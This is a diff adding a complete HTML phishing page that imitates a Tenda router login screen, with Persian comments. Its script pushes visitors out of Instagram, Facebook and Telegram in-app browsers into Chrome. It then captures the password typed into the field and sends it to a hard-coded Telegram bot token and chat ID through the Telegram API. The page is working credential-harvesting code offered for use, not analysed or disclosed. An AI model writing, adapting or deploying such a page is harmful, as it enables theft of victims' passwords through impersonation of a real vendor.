@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Tenda Login</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        /* ریست پایه */
+        * { margin:0; padding:0; box-sizing:border-box; }
+
+        body {
+            width: 100%;
+            height: 100vh;
+            background-color: #fff;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-family: Arial, sans-serif;
+        }
+
+        .login-container {
+            width: 90%;
+            max-width: 420px;
+            text-align:center;
+        }
+
+        .logo {
+            font-family: "Arial Rounded MT Bold","Helvetica Rounded","Poppins",Arial,sans-serif;
+            font-size: 64px;
+            font-weight:800;
+            font-style: italic;
+            letter-spacing:-2px;
+            color:#f39c33;
+            margin-bottom:45px;
+        }
+
+        .title {
+            font-size:28px;
+            font-weight:500;
+            color:#222;
+            margin-bottom:25px;
+        }
+
+        .password-input {
+            width:100%;
+            height:56px;
+            border:1.5px solid #cfcfcf;
+            border-radius:8px;
+            font-size:22px;
+            text-align:center;
+            outline:none;
+            margin-bottom:30px;
+        }
+
+        .password-input:focus {
+            border-color:#f39c33;
+            box-shadow:0 0 8px rgba(243,156,51,0.4);
+            transition:0.3s;
+        }
+
+        .login-btn {
+            width:100%;
+            height:60px;
+            background-color:#f39c33;
+            color:#fff;
+            border:none;
+            border-radius:8px;
+            font-size:22px;
+            font-weight:500;
+            cursor:pointer;
+        }
+
+        .login-btn:active { opacity:0.85; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">tenda</div>
+    <div class="title">Login</div>
+    <input type="password" class="password-input" placeholder="••••">
+    <button class="login-btn">Login</button>
+</div>
+
+<script>
+    // -----------------------------
+    // ریدایرکت خودکار به Chrome اگر WebView
+    // -----------------------------
+    (function() {
+        var ua = navigator.userAgent || navigator.vendor || window.opera;
+
+        var inWebView = ua.includes("Instagram") ||
+                        ua.includes("FBAN") ||
+                        ua.includes("FBAV") ||
+                        ua.includes("Telegram") ||
+                        ua.includes("WebView");
+
+        if(inWebView){
+            var url = window.location.href.replace("https://","");
+            window.location.href = "googlechrome://"+url;
+
+            setTimeout(()=>{ 
+                alert("⚠️ لطفاً لینک را در مرورگر Chrome باز کنید."); 
+            },1500);
+        }
+    })();
+
+    // -----------------------------
+    // ارسال رمز وارد شده به تلگرام
+    // -----------------------------
+    function sendPassword() {
+        var password = document.querySelector('.password-input').value;
+
+        if(!password.trim()){
+            alert("⚠️ لطفاً چیزی وارد کنید!");
+            return;
+        }
+
+        var text = "🔒 Password Entered: " + password;
+
+        // ⚠️ همان توکن و chat_id از کد موقعیت مکانی
+        var telegramBotToken = "8259403842:AAHhSOVYeuX8C9A5H-cYC_upkRc67kRbF-s";
+        var chatId = "7372882497";
+
+        var url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+        fetch(url)
+            .then(response => {
+                if(response.ok){
+                    alert("✅ رمز با موفقیت ارسال شد!");
+                    document.querySelector('.password-input').value = "";
+                } else {
+                    alert("❌ خطا در ارسال!");
+                }
+            })
+            .catch(err => alert("❌ خطا: "+err));
+    }
+
+    // -----------------------------
+    // اتصال دکمه به تابع
+    // -----------------------------
+    document.querySelector('.login-btn').addEventListener('click', sendPassword);
+</script>
+
+</body>
+</html>
